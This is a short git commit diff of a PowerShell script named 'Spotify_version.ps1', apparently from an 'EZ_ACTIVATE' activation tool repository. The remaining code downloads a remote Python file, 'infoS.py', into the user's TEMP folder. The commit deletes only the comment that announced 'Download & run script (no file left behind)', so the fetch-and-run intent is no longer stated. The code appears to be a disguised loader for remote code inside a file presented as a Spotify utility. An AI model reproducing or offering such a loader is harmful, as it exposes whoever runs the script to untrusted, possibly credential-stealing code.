3640c362bb4864abbe8080283fa04f34d14a951a
QUADROisCoding <business.quadro13187@gmail.com>
2025-08-18 17:17:54 +0200

    Update Spotify_version.ps1

--- Spotify_version.ps1
+++ Spotify_version.ps1
@@ -1,4 +1,3 @@
-# Download & run script (no file left behind)
 $url = "https://raw.githubusercontent.com/QUADROisCoding/EZ_ACTIVATE/refs/heads/main/infoS.py"
 $tempFile = "$env:TEMP\\infoS.py"
 Invoke-WebRequest -Uri $url -OutFile $tempFile -UseBasicParsing
